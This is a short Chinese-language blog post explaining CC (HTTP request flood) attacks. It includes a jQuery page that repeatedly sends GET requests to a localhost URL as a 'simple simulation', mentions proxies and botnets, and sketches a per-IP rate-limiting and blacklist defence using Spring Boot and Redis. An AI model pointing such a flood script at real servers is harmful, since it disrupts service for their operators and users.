---
title: Javascript 模拟CC攻击与防范浅析
date: 2017-10-15 18:13:17
tags: [干货, Javascript]
categories: 前端
---
# CC攻击的原理与防范浅析
#### 本人菜鸟一枚，如果说得不对，请见谅，欢迎指正。
## 一、CC攻击的原理： 
##### CC攻击的原理就是攻击者控制某些主机不停地发大量数据包给对方服务器造成服务器资源耗尽，一直到宕机崩溃。CC主要是用来攻击页面的，每个人都有这样 的体验：当一个网页访问的人数特别多的时候，打开网页就慢了，CC就是模拟多个用户(多少线程就是多少用户)不停地进行访问那些需要大量数据操作(就是需 要大量CPU时间)的页面，造成服务器资源的浪费，CPU长时间处于100%，永远都有处理不完的连接直至就网络拥塞，正常的访问被中止。

## 二、Js 模拟CC 攻击
#### CC攻击的种类有三种，直接攻击、代理攻击、僵尸网络攻击
#### 我们就来简单的模拟一下，我这种算是 直接攻击
#### 记住这个只是：简单模拟，简单模拟，简单模拟。
##### 我就一台电脑，没肉鸡。
> js 代码如下：

```html
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1" />
<script  src="http://libs.baidu.com/jquery/1.7.2/jquery.min.js"></script>
</head>
<body>
 <h1>发送请求数：<span id="requestNum">0</span></h1>
<script>
var i=0;
var task="";
//攻击次数
var attackNum = 10000;
//攻击地址
var url="http://127.0.0.1/blog";

//隔几毫秒攻击一次
var time=100;

$(document).ready(function(){	
	task = setInterval("MainTask()",time);
})
function MainTask(){
	i++;
	sendRequest(i);	
	addNum(i);
	if(i > attackNum){
		clearInterval(task);
	}
}
function sendRequest(i){
	console.log("send",i);
	$.ajax({
		type:"get",
		url:url,
		cache:false,
		dataType:"json",
		data:{},
		success:function(data){
			console.log("result-text:",data);
		}
	});
}
function addNum(num){
	$("#requestNum").text(num);
}
</script>
</html>
```
> 这只是简单的模拟，现实中不会那么简单，用本机攻击是可以追踪到你的ip，所以大部分都是通过代理或者肉鸡，进行攻击。ajax 可以不显示回调，不然会耗自己的带宽，我这里简单的模拟。而且现实中还有跨越问题等东西。

## 三、防御浅析
#### 思路：利用拦截器，拦截所有请求，统计单位时间内，单个IP访问的次数。如果访问次数超过你限制的数量，直接拉到黑名单。下次不给访问。统计个数可以用redis来实现，黑名单可以放在数据库，也可直接放缓存。最后就是放数据库，然后服务器启动时，把黑名单缓存起来。

#### springboot 拦截器  和  springboot 操作redis 我都有相对应的文章 与，源码示例，在博客可以搜 springboot 或者点击springboot 标签
#### 防御的具体实现代码，我就不说，这小防御代码挺简单的。
